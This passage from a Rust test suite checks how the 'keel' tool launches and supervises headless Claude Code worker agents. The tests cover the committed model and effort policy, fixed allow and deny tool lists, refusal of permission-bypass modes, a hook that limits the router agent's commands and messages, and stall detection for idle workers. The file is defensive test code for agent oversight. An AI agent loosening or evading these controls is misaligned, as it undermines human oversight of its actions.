        assert!(!ok && out.contains("no worker policy: [router] worker_model / worker_efforts / worker_default_effort in .keel/config.toml at HEAD of"), "{what}: {out}");
        assert!(!l.main.join(".router/out/q.pid").exists(), "{what}: started a worker");
    }

    // an uncommitted edit, even staged, cannot widen the committed policy
    l.commit_config(Some("[router]   # comment\nworker_model = \"opus\"  # trailing\n\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"medium\"\n[next]\nx = 1\n"));
    std::fs::write(l.main.join(".keel/config.toml"), "[router]\nworker_model = \"sonnet\"\nworker_efforts = [\"max\"]\nworker_default_effort = \"max\"\n").unwrap();
    git(&l.main, &["add", ".keel"]);
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "sonnet"]);
    assert!(!ok && out.contains("model must be opus"), "{out}");
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "opus", "--effort", "max"]);
    assert!(!ok && out.contains("effort must be one of: medium high"), "{out}");

    // the launcher enforces whatever the committed policy says; it hardcodes no model
    l.commit_config(Some("[router]\nworker_model = \"sonnet\"\nworker_efforts = [\"high\"]\nworker_default_effort = \"high\"\n"));
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "opus"]);
    assert!(!ok && out.contains("model must be sonnet ([router] worker_model"), "{out}");
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "sonnet"]);
    assert!(ok && out.contains(" effort=high "), "{out}");
    l.wait_exit("q");

    // the accepted efforts are the committed list, not a built-in one: narrowed, medium is refused;
    // widened, max is accepted on spawn and resume
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "sonnet", "--effort", "medium"]);
    assert!(!ok && out.contains("effort must be one of: high ("), "{out}");
    l.commit_config(Some("[router]\nworker_model = \"sonnet\"\nworker_efforts = [\"high\", \"max\"]\nworker_default_effort = \"high\"\n"));
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "sonnet", "--effort", "max"]);
    assert!(ok && out.contains(" effort=max "), "{out}");
    let sid = field(&out, "session=").to_string();
    l.wait_exit("q");
    assert_eq!(option(&worker_argv(&l.main, "q"), "--effort"), "max");
    let (ok, out) = l.run(&["resume", "q", &sid, wt, brief, "sonnet", "--effort", "medium"]);
    assert!(!ok && out.contains("effort must be one of: high max ("), "{out}");
    let (ok, out) = l.run(&["resume", "q", &sid, wt, brief, "sonnet", "--effort", "max"]);
    assert!(ok && out.contains(" effort=max "), "{out}");
    l.wait_exit("q");
    assert_eq!(option(&worker_argv(&l.main, "q"), "--effort"), "max");

    // the default is worker_default_effort, not the list's first entry: a bare spawn and a bare
    // resume of a session spawned at high both run at medium; read from HEAD on a branch other than main
    git(&l.main, &["checkout", "-qb", "router"]);
    l.commit_config(Some("[router]\nworker_model = \"sonnet\"\nworker_efforts = [\"high\", \"medium\"]\nworker_default_effort = \"medium\"\n"));
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "sonnet"]);
    assert!(ok && out.contains(" effort=medium "), "{out}");
    l.wait_exit("q");
    assert_eq!(option(&worker_argv(&l.main, "q"), "--effort"), "medium");
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "sonnet", "--effort", "high"]);
    assert!(ok && out.contains(" effort=high "), "{out}");
    let sid = field(&out, "session=").to_string();
    l.wait_exit("q");
    let (ok, out) = l.run(&["resume", "q", &sid, wt, brief, "sonnet"]);
    assert!(ok && out.contains(" effort=medium "), "{out}");
    l.wait_exit("q");
    assert_eq!(option(&worker_argv(&l.main, "q"), "--effort"), "medium");

    // every level word is accepted when committed: low and xhigh, as the default and as --effort (review r5 V1)
    l.commit_config(Some("[router]\nworker_model = \"sonnet\"\nworker_efforts = [\"low\", \"xhigh\"]\nworker_default_effort = \"low\"\n"));
    for (extra, effort) in [(vec![], "low"), (vec!["--effort", "xhigh"], "xhigh")] {
        let mut args = vec!["spawn", "q", wt, brief, "sonnet"];
        args.extend(&extra);
        let (ok, out) = l.run(&args);
        assert!(ok && out.contains(&format!(" effort={effort} ")), "{out}");
        l.wait_exit("q");
        assert_eq!(option(&worker_argv(&l.main, "q"), "--effort"), effort);
    }

    // the reader's accepted edges in one policy: a tab before the header's comment, a dotted and
    // hyphenated model, trailing blanks after a value, a three-entry list, and indented or similarly
    // named headers that end the section
    l.commit_config(Some("[router]\t# c\nworker_model = \"opus-4.5\" \t\nworker_efforts = [\"low\", \"medium\", \"xhigh\"]\nworker_default_effort = \"low\"\n\t[next]\nx = 1\n  [routers]\ny = 2\n"));
    for effort in ["low", "medium", "xhigh"] {
        let (ok, out) = l.run(&["spawn", "q", wt, brief, "opus-4.5", "--effort", effort]);
        assert!(ok && out.contains(&format!(" effort={effort} ")), "{out}");
        l.wait_exit("q");
    }
    // an effort matches a whole list entry, never part of one
    for part in ["med", "igh", "low medium"] {
        let (ok, out) = l.run(&["spawn", "q", wt, brief, "opus-4.5", "--effort", part]);
        assert!(!ok && out.contains("effort must be one of: low medium xhigh ("), "{part}: {out}");
    }
}

/// DEC-39: the repo's committed worker policy is opus at medium or high effort, medium by default.
#[test]
fn committed_worker_policy_is_opus_at_medium_or_high_effort() {
    let o = git(root(), &["show", "HEAD:.keel/config.toml"]);
    let config = String::from_utf8(o.stdout).unwrap();
    let section: Vec<&str> = config
        .lines()
        .skip_while(|l| !l.starts_with("[router]"))
        .skip(1)
        .take_while(|l| !l.starts_with('['))
        .filter(|l| !l.trim().is_empty())
        .collect();
    assert_eq!(section, ["worker_model = \"opus\"", "worker_efforts = [\"medium\", \"high\"]", "worker_default_effort = \"medium\""]);
}

const WORKER_GRANTS: [&str; 11] = [
    "cargo build",
    "cargo test",
    "cargo check",
    "cargo clippy",
    "cargo fmt",
    "keel preflight",
    "keel verify-doc",
    "keel verify-dod",
    "keel notes write",
    "keel lint",
    "keel check",
];
const WORKER_DENIES: [&str; 4] = ["Bash(keel mr)", "Bash(keel mr *)", "Bash(cargo run)", "Bash(cargo run *)"];

/// The argv the stub `claude` recorded for worker <name> under `checkout`'s .router/out, read from its
/// bracketed line (one item per argv element: a word-split `Bash(cargo build *)` cannot pass). Every
/// worker, spawned or resumed, gets exactly these options once each and the fixed grant/deny lists;
/// an extra `--allowedTools Bash(*)` or a bypass flag fails here.
fn worker_argv(checkout: &Path, name: &str) -> Vec<String> {
    let out = std::fs::read_to_string(checkout.join(format!(".router/out/{name}.out"))).unwrap();
    let line = out.lines().find(|x| x.starts_with('[')).unwrap_or_else(|| panic!("no stub argv: {out}"));
    let a: Vec<String> = line[1..line.len() - 1].split("][").map(String::from).collect();
    let flags: Vec<&str> = a.iter().map(String::as_str).filter(|x| x.starts_with('-')).collect();
    let start = if flags.contains(&"--resume") { "--resume" } else { "--session-id" };
    let expected = ["-p", start, "--allowedTools", "--disallowedTools", "-n", "--model", "--effort", "--agent", "--permission-mode", "--max-budget-usd"];
    assert_eq!(flags, expected, "{name}: options in {a:?}");
    let list = |flag: &str| -> Vec<String> {
        let i = a.iter().position(|x| x == flag).unwrap();
        a[i + 1..].iter().take_while(|x| !x.starts_with('-')).cloned().collect()
    };
    let allow: Vec<String> = WORKER_GRANTS.iter().flat_map(|c| [format!("Bash({c})"), format!("Bash({c} *)")]).collect();
    assert_eq!(list("--allowedTools"), allow, "{name}: allow list");
    assert_eq!(list("--disallowedTools"), WORKER_DENIES, "{name}: deny list");
    a
}

/// The value after `flag` in an argv.
fn option(a: &[String], flag: &str) -> String {
    a[a.iter().position(|x| x == flag).unwrap() + 1].clone()
}

/// E-ROUTERFIX.W1: headless workers were refused cargo/keel (nobody can approve a `claude -p`
/// prompt), and the launcher hardcoded acceptEdits. The grant travels on the launcher's argv only;
/// the mode is a validated per-run option.
#[test]
fn launcher_grants_workers_cargo_and_keel_and_validates_the_permission_mode() {
    let l = launcher();
    let wt = l.wt.to_str().unwrap();
    let brief = ".router/briefs/b.md";
    let mode_of = |name: &str| {
        l.wait_exit(name);
        let a = worker_argv(&l.main, name);
        option(&a, "--permission-mode")
    };
    let run_dir = |name: &str, kind: &str, file: &str| {
        let runs = std::fs::read_dir(l.main.join(".router/runs")).unwrap();
        let mut values: Vec<String> = runs
            .map(|e| e.unwrap().path())
            .filter(|p| {
                let f = p.file_name().unwrap().to_str().unwrap();
                f.starts_with(&format!("{name}-")) && f.ends_with(&format!("-{kind}"))
            })
            .map(|p| std::fs::read_to_string(p.join(file)).unwrap().trim().to_string())
            .collect();
        values.sort();
        values
    };
    let run_dir_mode = |name: &str, kind: &str| run_dir(name, kind, "permission-mode");
    let run_dir_effort = |name: &str, kind: &str| run_dir(name, kind, "effort");

    for (i, (extra, why)) in [
        (vec!["--permission-mode", "bypassPermissions"], "permission mode must be"),
        (vec!["--permission-mode", "dontAsk"], "permission mode must be"),
        (vec!["--permission-mode", "default"], "permission mode must be"),
        (vec!["--permission-mode", ""], "permission mode must be"),
        (vec!["--permission-mode"], "[--permission-mode acceptEdits|plan]"),
        (vec!["--bogus", "x"], "[--permission-mode acceptEdits|plan]"),
        (vec!["--permission-mode", "plan", "x"], "[--permission-mode acceptEdits|plan]"),
        (vec!["--effort", "low"], "effort must be one of: medium high ([router] worker_efforts in .keel/config.toml)"),
        (vec!["--effort", "max"], "effort must be one of: medium high"),
        (vec!["--effort", "ultracode"], "effort must be one of: medium high"),
        (vec!["--effort", "medium high"], "effort must be one of: medium high"),
        (vec!["--effort", ""], "effort must be one of: medium high"),
        (vec!["--effort"], "[--effort <level>]"),
        (vec!["--effort", "high", "--effort", "high"], "[--effort <level>]"),
        (vec!["--permission-mode", "plan", "--permission-mode", "plan"], "[--effort <level>]"),
        (vec!["--permission-mode", "plan", "--effort"], "[--effort <level>]"),
        (vec!["--effort", "high", "--permission-mode", "plan", "x", "y"], "[--effort <level>]"),
    ]
    .into_iter()
    .enumerate()
    {
        let name = format!("r{i}");
        let mut args = vec!["spawn", &name, wt, brief, "opus"];
        args.extend(&extra);
        let (ok, out) = l.run(&args);
        assert!(!ok && out.contains(why), "{extra:?} not refused for {why}: {out}");
        assert!(!l.main.join(format!(".router/out/{name}.pid")).exists(), "{extra:?} started a worker");
    }

    let (ok, out) = l.run(&["spawn", "d", wt, brief, "opus"]);
    assert!(ok && out.contains("permission-mode=acceptEdits"), "{out}");
    let (ok, out) = l.run(&["spawn", "p", wt, brief, "opus", "--permission-mode", "plan"]);
    assert!(ok && out.contains("permission-mode=plan"), "{out}");
    let sid = field(&out, "session=").to_string();

    assert_eq!(mode_of("d"), "acceptEdits");
    assert_eq!(mode_of("p"), "plan");
    assert_eq!(run_dir_mode("d", "spawn"), ["acceptEdits"]);
    assert_eq!(run_dir_mode("p", "spawn"), ["plan"]);

    // a resume states its own mode or gets the default; it never inherits the spawn's plan
    let (ok, out) = l.run(&["resume", "p", &sid, wt, brief, "opus"]);
    assert!(ok && out.contains("permission-mode=acceptEdits"), "{out}");
    assert_eq!(mode_of("p"), "acceptEdits");
    let (ok, out) = l.run(&["resume", "p", &sid, wt, brief, "opus", "--permission-mode", "plan"]);
    assert!(ok && out.contains("permission-mode=plan"), "{out}");
    assert_eq!(mode_of("p"), "plan");
    let (ok, out) = l.run(&["resume", "p", &sid, wt, brief, "opus", "--permission-mode", "bypassPermissions"]);
    assert!(!ok && out.contains("permission mode must be"), "{out}");
    assert_eq!(run_dir_mode("p", "resume"), ["acceptEdits", "plan"]);

    // E-SEED2.W7: effort is medium by default, high when asked, in either order with the mode; it
    // lands on the RUNNING line, in the run dir and after --model on the argv; a resume does not inherit it
    let effort_of = |name: &str| {
        l.wait_exit(name);
        let a = worker_argv(&l.main, name);
        assert_eq!(option(&a, "--model"), "opus");
        (option(&a, "--effort"), option(&a, "--permission-mode"))
    };
    let mut sids = std::collections::HashMap::new();
    for (name, extra, effort, mode) in [
        ("e1", vec![], "medium", "acceptEdits"),
        ("e2", vec!["--effort", "high"], "high", "acceptEdits"),
        ("e3", vec!["--effort", "high", "--permission-mode", "plan"], "high", "plan"),
        ("e4", vec!["--permission-mode", "plan", "--effort", "medium"], "medium", "plan"),
    ] {
        let mut args = vec!["spawn", name, wt, brief, "opus"];
        args.extend(&extra);
        let (ok, out) = l.run(&args);
        assert!(ok && out.contains(&format!(" permission-mode={mode} effort={effort} ")), "{extra:?}: {out}");
        sids.insert(name, field(&out, "session=").to_string());
        assert_eq!(effort_of(name), (effort.to_string(), mode.to_string()), "{extra:?}");
        assert_eq!(run_dir_effort(name, "spawn"), [effort], "{extra:?}");
    }
    let sid = sids["e2"].clone();
    let (ok, out) = l.run(&["resume", "e2", &sid, wt, brief, "opus"]);
    assert!(ok && out.contains(" effort=medium "), "{out}");
    assert_eq!(effort_of("e2").0, "medium");
    assert_eq!(run_dir_effort("e2", "spawn"), ["high"]);
    assert_eq!(run_dir_effort("e2", "resume"), ["medium"]);
    let (ok, out) = l.run(&["resume", "e2", &sid, wt, brief, "opus", "--effort", "low"]);
    assert!(!ok && out.contains("effort must be one of"), "{out}");

    // router side: the guard admits the option on the launcher shape, and the grant never reaches it
    assert_eq!(bash("scripts/router-worker.sh spawn n /w .router/briefs/n.md opus --permission-mode plan"), None);
    assert_eq!(bash("scripts/router-worker.sh spawn n /w .router/briefs/n.md opus --effort high --permission-mode plan"), None);
    for c in WORKER_GRANTS {
        assert!(bash(&format!("{c} x")).is_some(), "router may run {c}");
    }
}

/// Blockers 3-4 of the close review: the shipped PUSHED probe fired before anything was pushed
/// (equality with local main), and worker-ops' variant never fired for an epic (equality with the
/// signed tip, which a --no-ff merge does not push). It must be false when staged, false when merged
/// locally, true once pushed.
#[test]
fn pushed_probe_fires_only_after_the_merge_reaches_origin() {
    let cmds = std::fs::read_to_string(root().join("skills/keel-router/references/commands.md")).unwrap();
    let line = cmds.lines().find(|l| l.trim_end().ends_with("echo PUSHED")).expect("no PUSHED probe in commands.md");
    let probe = line.strip_prefix("until ").unwrap().split("; do").next().unwrap();
    let ops = std::fs::read_to_string(root().join("skills/keel-router/references/worker-ops.md")).unwrap();
    let row = ops.lines().find(|l| l.starts_with("| pushes")).unwrap();
    assert!(row.contains("merge-base --is-ancestor <tip> origin/<b>"), "worker-ops push probe drifted from commands.md: {row}");

    let d = TempDir::new().unwrap();
    let origin = d.path().join("origin.git");
    let main = d.path().join("main");
    git(d.path(), &["init", "-q", "--bare", "-b", "main", origin.to_str().unwrap()]);
    git(d.path(), &["clone", "-q", origin.to_str().unwrap(), main.to_str().unwrap()]);
    git(&main, &["commit", "-q", "--allow-empty", "-m", "base"]);
    git(&main, &["push", "-q", "origin", "main"]);
    git(&main, &["switch", "-q", "-c", "epic/E-X"]);
    git(&main, &["commit", "-q", "--allow-empty", "-m", "epic work"]);
    let t = String::from_utf8(git(&main, &["rev-parse", "HEAD"]).stdout).unwrap().trim().to_string();
    git(&main, &["switch", "-q", "main"]);
    let fires = || hermetic(&mut common::cmd("sh")).args(["-c", probe]).env("MAIN", &main).env("T", &t).output().unwrap().status.success();

    assert!(!fires(), "PUSHED fired when the action was only staged");
    git(&main, &["merge", "-q", "--no-ff", "-m", "merge epic", "epic/E-X"]);
    assert!(!fires(), "PUSHED fired before the push");
    git(&main, &["push", "-q", "origin", "main"]);
    assert!(fires(), "PUSHED did not fire after the push");
}

fn age(path: &Path, secs: u64) {
    let f = std::fs::OpenOptions::new().create(true).append(true).open(path).unwrap();
    f.set_modified(std::time::SystemTime::now() - Duration::from_secs(secs)).unwrap();
}

/// Bounded wait for a condition another process brings about.
fn until(what: &str, mut cond: impl FnMut() -> bool) {
    let t = Instant::now();
    while !cond() {
        assert!(t.elapsed() < BOUND, "timed out waiting for {what}");
        std::thread::sleep(Duration::from_millis(10));
    }
}

/// Whether `pid` has a `<shell> -c` child, i.e. the stub is busy.
fn has_shell_child(pid: &str) -> bool {
    let o = Command::new("ps").args(["-A", "-o", "ppid=,command="]).output().unwrap();
    String::from_utf8(o.stdout).unwrap().lines().any(|l| {
        let w: Vec<&str> = l.split_whitespace().collect();
        w.len() > 2 && w[0] == pid && w[1].ends_with("sh") && w[2] == "-c"
    })
}

struct Stepped {
    child: std::process::Child,
    dir: PathBuf,
}

impl Stepped {
    /// Block until `wait` has judged poll n and is sleeping; panics with its line if it returned instead.
    fn at(&mut self, n: u32) {
        let polls = || std::fs::read_to_string(self.dir.join("polls")).ok().and_then(|s| s.trim().parse::<u32>().ok());
        let t = Instant::now();
        while polls() != Some(n) {
            if self.child.try_wait().unwrap().is_some() {
                let mut out = String::new();
                std::io::Read::read_to_string(self.child.stdout.as_mut().unwrap(), &mut out).unwrap();
                panic!("wait returned before poll {n}: {out}");
            }
            assert!(t.elapsed() < BOUND, "wait never reached poll {n}");
            std::thread::sleep(Duration::from_millis(10));
        }
    }

    fn go(&self, n: u32) {
        std::fs::write(self.dir.join(format!("go-{n}")), "").unwrap();
    }

    /// The one line `wait` prints once released from its last poll.
    fn line(mut self) -> String {
        let t = Instant::now();
        while self.child.try_wait().unwrap().is_none() {
            if t.elapsed() > BOUND {
                self.child.kill().unwrap();
                self.child.wait().unwrap();
                panic!("wait never returned");
            }
            std::thread::sleep(Duration::from_millis(10));
        }
        let o = self.child.wait_with_output().unwrap();
        assert!(o.status.success(), "{o:?}");
        String::from_utf8(o.stdout).unwrap()
    }
}

/// E-SEED2.W8: `wait <name> [<stall-min>]` blocks while the worker runs and returns one line when it
/// exits (EXITED) or stalls (STALLED: on two polls running, no `sh -c` child and every transcript of its
/// newest run, main and subagent, idle past the threshold, naming the newest; the pid file when no
/// transcript exists). Polls are stepped through the `sleep` shim, so each judges a state the test set.
/// Bad input exits 2.
#[test]
fn wait_blocks_until_the_worker_exits_or_stalls() {
    let l = launcher();
    let wt = l.wt.to_str().unwrap();
    let brief = ".router/briefs/b.md";
    let base = l.main.parent().unwrap().to_path_buf();
    let release = |k: u8| base.join(format!("release-{k}"));
    std::fs::create_dir_all(l.main.join(".router/out")).unwrap();
    std::fs::write(l.main.join(".router/out/orphan.pid"), "1\n").unwrap();
    for (args, why) in [
        (vec!["wait"], "wait <name>"),
        (vec!["wait", "n", "1", "x"], "wait <name>"),
        (vec!["wait", "-n"], "bad name"),
        (vec!["wait", "N"], "bad name"),
        (vec!["wait", "n", "-1"], "stall-min"),
        (vec!["wait", "n", "10000"], "stall-min"),
        (vec!["wait", "n", "0"], "stall-min"),
        (vec!["wait", "n", "x"], "stall-min"),
        (vec!["wait", "n", ""], "stall-min"),
        (vec!["wait", "ghost"], "no worker ghost"),
        (vec!["wait", "orphan"], "no recorded run for orphan"),
    ] {
        let (ok, out) = l.run_env(&args, &[]);
        assert!(!ok && out.contains(why), "{args:?} not refused for {why}: {out}");
    }

    // exits: still waiting while the worker lives, EXITED once it is gone
    let out = l.hold(&["spawn", "n", wt, brief, "opus"], &release(1));
    let sid = field(&out, "session=").to_string();
    let pid = field(&out, "pid=").to_string();
    let mut w = l.wait_stepped(&["wait", "n"], "exit");
    w.at(1);
    std::fs::write(release(1), "").unwrap();
    l.wait_exit("n");
    w.go(1);
    let out = w.line();
    assert!(out.starts_with(&format!("EXITED name=n pid={pid} ")) && out.lines().count() == 1, "{out}");
    let (ok, out) = l.run_env(&["wait", "n"], &[]);
    assert!(ok && out.starts_with("EXITED name=n ") && out.lines().count() == 1, "an exited worker returns at once: {out}");

    // quiet, then busy (a command ran), then quiet: the busy poll resets, so STALLED needs two more
    let tr = l.transcript(&l.wt, &sid);
    let out = l.hold(&["resume", "n", &sid, wt, brief, "opus"], &release(2));
    let pid = field(&out, "pid=").to_string();
    age(&tr, 120);
    let busy = base.join("release-2.busy");
    let mut w = l.wait_stepped(&["wait", "n", "1"], "busy");
    w.at(1);
    std::fs::write(&busy, "").unwrap();
    until("busy stub", || has_shell_child(&pid));
    w.go(1);
    w.at(2);
    std::fs::remove_file(&busy).unwrap();
    until("idle stub", || !has_shell_child(&pid));
    age(&tr, 120);
    w.go(2);
    w.at(3);
    w.go(3);
    let out = w.line();
    assert!(out.starts_with(&format!("STALLED name=n pid={pid} idle=2m since={}\n", tr.display())), "{out}");

    // quiet, then a subagent writes, then quiet: the fresh poll resets; the newest transcript is named
    let sub = tr.with_extension("").join("subagents/agent-a.jsonl");
    std::fs::create_dir_all(sub.parent().unwrap()).unwrap();
    age(&tr, 180);
    let mut w = l.wait_stepped(&["wait", "n", "1"], "fresh");
    w.at(1);
    std::fs::write(&sub, "{}\n").unwrap();
    w.go(1);
    w.at(2);
    age(&sub, 120);
    w.go(2);
    w.at(3);
    w.go(3);
    let out = w.line();
    assert!(out.starts_with("STALLED name=n ") && out.ends_with(&format!(" idle=2m since={}\n", sub.display())), "{out}");

    // thresholds are minutes, 15 by default: 30s is no 1-minute stall, 10 min no default stall
    for (args, under, over, idle) in [(vec!["wait", "n", "1"], 30, 120, "2m"), (vec!["wait", "n"], 600, 960, "16m")] {
        age(&tr, under);
        age(&sub, under);
        let mut w = l.wait_stepped(&args, idle);
        for n in 1..=2 {
            w.at(n);
            w.go(n);
        }
        w.at(3);
        age(&tr, over);
        age(&sub, over);
        w.go(3);
        w.at(4);
        w.go(4);
        let out = w.line();
        assert!(out.starts_with("STALLED name=n ") && out.contains(&format!(" idle={idle} ")), "{out}");
    }

    // no transcript: the pid file's age stands in
    std::fs::remove_file(&tr).unwrap();
    std::fs::remove_dir_all(tr.with_extension("")).unwrap();
    age(&l.main.join(".router/out/n.pid"), 120);
    let mut w = l.wait_stepped(&["wait", "n", "1"], "pid");
    w.at(1);
    w.go(1);
    let out = w.line();
    assert!(out.starts_with("STALLED name=n ") && out.contains("since=") && out.trim_end().ends_with("n.pid"), "{out}");
    std::fs::write(release(2), "").unwrap();
    l.wait_exit("n");
    assert!(std::fs::read_to_string(l.main.join(".router/out/n.out")).unwrap().starts_with("stub "), "wait touched n.out");

    // a name spawned again (new session, other worktree) is judged by its newest run only
    let out = l.hold(&["spawn", "n", l.wt2.to_str().unwrap(), brief, "opus"], &release(3));
    let tr2 = l.transcript(&l.wt2, field(&out, "session="));
    std::fs::write(&tr, "{}\n").unwrap();
    age(&tr2, 120);
    let mut w = l.wait_stepped(&["wait", "n", "1"], "newest");
    w.at(1);
    w.go(1);
    let out = w.line();
    assert!(out.ends_with(&format!(" since={}\n", tr2.display())), "{out}");
    std::fs::write(release(3), "").unwrap();
    l.wait_exit("n");
}

/// One router tool call through the PreToolUse command `checkout`'s .claude/settings.json wires, run
/// as Claude Code runs it; Some(reason) = denied, None = allowed.
fn wired_guard(checkout: &Path, tool: &str, input: serde_json::Value) -> Option<String> {
    let s: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(checkout.join(".claude/settings.json")).unwrap()).unwrap();
    let cmd = s["hooks"]["PreToolUse"][0]["hooks"][0]["command"].as_str().unwrap();
    let event = serde_json::json!({"agent_type": "router", "tool_name": tool, "tool_input": input, "cwd": checkout});
    let mut p = common::cmd("/bin/sh")
        .args(["-c", cmd])
        .env("CLAUDE_PROJECT_DIR", checkout)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    std::io::Write::write_all(&mut p.stdin.take().unwrap(), event.to_string().as_bytes()).unwrap();
    decision(&event, p.wait_with_output().unwrap())
}

/// E-ROUTERFIX e2e (W5): one worker's life as the router drives it, in a scratch clone of Keel's own
/// tree with the working tree's epic files laid over it and keel's hooks installed. A new worktree
/// inherits the signer list (W3); every router call passes the settings-wired guard and each allowed
/// command runs exactly as judged; the worker starts in plan mode with the fixed grant (W1) under the
/// name the subscription addresses (W2); `wait` reports it STALLED by its transcript, then EXITED (W4).
#[test]
fn epic_e2e_router_drives_a_granted_worker_in_a_seeded_worktree_to_its_end() {
    let d = TempDir::new().unwrap();
    let base = d.path().canonicalize().unwrap();
    let c = base.join("c");
    git(&base, &["clone", "-q", root().to_str().unwrap(), c.to_str().unwrap()]);
    for f in ["scripts/router-worker.sh", "scripts/router-guard.jq", ".claude/settings.json", ".gitworktreecopy"] {
        std::fs::copy(root().join(f), c.join(f)).unwrap();
    }
    let keel = Path::new(env!("CARGO_BIN_EXE_keel"));
    assert!(common::cmd(keel).args(["hooks", "install"]).current_dir(&c).output().unwrap().status.success());
    std::fs::write(c.join(".mr-allowed"), "username: owner\n").unwrap();

    // W3: the worktree the worker will run in is created through keel's post-checkout hook
    let wt = base.join("wt");
    let path = format!("{}:{}", keel.parent().unwrap().display(), std::env::var("PATH").unwrap());
    let o = hermetic(&mut common::cmd("git")).args(["worktree", "add", "-q", "-b", "wu/x/e2e", wt.to_str().unwrap()]).current_dir(&c).env("PATH", &path).output().unwrap();
    assert!(o.status.success(), "{}", String::from_utf8_lossy(&o.stderr));
    assert_eq!(std::fs::read_to_string(wt.join(".mr-allowed")).ok().as_deref(), Some("username: owner\n"), "worktree not seeded");

    let stub = base.join("claude");
    stub_claude(&stub);
    let release = base.join("release");
    let config = base.join("config");
    let owner = std::process::id().to_string();
    let router = |cmd: &str| -> String {
        assert_eq!(wired_guard(&c, "Bash", serde_json::json!({ "command": cmd })), None, "guard denied {cmd:?}");
        let mut p = common::cmd("/bin/sh")
            .args(["-c", cmd])
            .current_dir(&c)
            .env("ROUTER_CLAUDE", &stub)
            .env("STUB_RELEASE", &release)
            .env("STUB_OWNER", &owner)
            .env("CLAUDE_CONFIG_DIR", &config)
            .env("ROUTER_WAIT_POLL", "0.2")
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap();
        // a `wait` that never reaches its line fails here instead of hanging the suite
        let t = Instant::now();
        while p.try_wait().unwrap().is_none() {
            if t.elapsed() > Duration::from_secs(20) {
                p.kill().unwrap();
                panic!("{cmd}: no result within 20s");
            }
            std::thread::sleep(Duration::from_millis(20));
        }
        let o = p.wait_with_output().unwrap();
        let out = format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr));
        assert!(o.status.success(), "{cmd}: {out}");
        out
    };

    let name = "e2e-w";
    let brief = c.join(format!(".router/briefs/{name}.md"));
    assert_eq!(wired_guard(&c, "Write", serde_json::json!({ "file_path": brief })), None);
    std::fs::create_dir_all(brief.parent().unwrap()).unwrap();
    std::fs::write(&brief, "run the gate\n").unwrap();

    // W1: spawned in plan mode
    let out = router(&format!("scripts/router-worker.sh spawn {name} {} .router/briefs/{name}.md opus --effort high --permission-mode plan", wt.display()));
    assert!(out.starts_with(&format!("RUNNING name={name} ")) && out.contains(" permission-mode=plan effort=high "), "{out}");
    let (sid, pid) = (field(&out, "session=").to_string(), field(&out, "pid=").to_string());
    let copy = field(&out, "brief=");
    assert!(copy.starts_with(wt.to_str().unwrap()) && std::fs::read_to_string(copy).unwrap() == "run the gate\n", "{out}");

    // W2: the router subscribes to the worker's end and can send it nothing
    assert_eq!(wired_guard(&c, "SendMessage", serde_json::json!({"to": name, "notify_when_idle": true})), None);
    assert!(wired_guard(&c, "SendMessage", serde_json::json!({"to": name, "notify_when_idle": true, "message": "also push"})).is_some());
    // the grant is the worker's alone
    for cmd in ["cargo test", "keel preflight wu HEAD", "keel mr confirm wu HEAD --as owner"] {
        assert!(wired_guard(&c, "Bash", serde_json::json!({ "command": cmd })).is_some(), "router may run {cmd:?}");
    }

    // W4: an idle worker is STALLED, found by its session id under a project dir no naming rule gives
    let tr = config.join("projects/-e2e-odd-dir-7f3k").join(format!("{sid}.jsonl"));
    std::fs::create_dir_all(tr.parent().unwrap()).unwrap();
    std::fs::write(&tr, "{}\n").unwrap();
    age(&tr, 120);
    let out = router(&format!("scripts/router-worker.sh wait {name} 1"));
    assert_eq!(out, format!("STALLED name={name} pid={pid} idle=2m since={}\n", tr.display()));

    // the worker ends: EXITED, and its argv carried the grant, the mode and the subscribed name
    std::fs::write(&release, "").unwrap();
    let out = router(&format!("scripts/router-worker.sh wait {name}"));
    assert_eq!(out, format!("EXITED name={name} pid={pid} out={}\n", c.join(format!(".router/out/{name}.out")).display()));
    let a = worker_argv(&c, name);
    assert_eq!(option(&a, "--permission-mode"), "plan");
    assert_eq!(option(&a, "--effort"), "high");
    assert_eq!(option(&a, "-n"), name);
    assert_eq!(option(&a, "--session-id"), sid);
}

/// A checkout holding scripts/router-watch.sh, cloned from a bare `origin.git` file remote (no
/// network), plus the stepped `sleep` shim.
struct Watcher {
    _d: TempDir,
    base: PathBuf,
    main: PathBuf,
}

fn watcher() -> Watcher {
    let d = TempDir::new().unwrap();
    let base = d.path().canonicalize().unwrap();
    let (origin, main) = (base.join("origin.git"), base.join("main"));
    git(&base, &["init", "-q", "--bare", "-b", "main", origin.to_str().unwrap()]);
    git(&base, &["clone", "-q", origin.to_str().unwrap(), main.to_str().unwrap()]);
    std::fs::create_dir_all(main.join("scripts")).unwrap();
    std::fs::copy(root().join("scripts/router-watch.sh"), main.join("scripts/router-watch.sh")).unwrap();
    git(&main, &["add", "."]);
    git(&main, &["commit", "-qm", "base"]);
    git(&main, &["push", "-q", "origin", "main"]);
    sleep_shim(&base);
    Watcher { _d: d, base, main }
}

impl Watcher {
    fn sha(&self, rev: &str) -> String {
        String::from_utf8(git(&self.main, &["rev-parse", rev]).stdout).unwrap().trim().to_string()
    }

    /// Write each file (content = msg) on the current branch and commit them; returns the new tip.
    fn commit(&self, files: &[&str], msg: &str) -> String {
        for f in files {
            std::fs::write(self.main.join(f), msg).unwrap();
            git(&self.main, &["add", f]);
        }
        git(&self.main, &["commit", "-qm", msg]);
        self.sha("HEAD")
    }

    /// `scripts/router-watch.sh <args>` as the router runs it, its polls stepped through steps-<k>/.
    fn cmd(&self, args: &[&str], k: &str, env: &[(&str, &str)]) -> (Command, PathBuf) {
        let dir = self.base.join(format!("steps-{k}"));
        std::fs::create_dir_all(&dir).unwrap();
        let mut c = common::cmd("scripts/router-watch.sh");
        hermetic(&mut c)
            .args(args)
            .current_dir(&self.main)
            .env("PATH", format!("{}:{}", self.base.join("shim").display(), std::env::var("PATH").unwrap()))
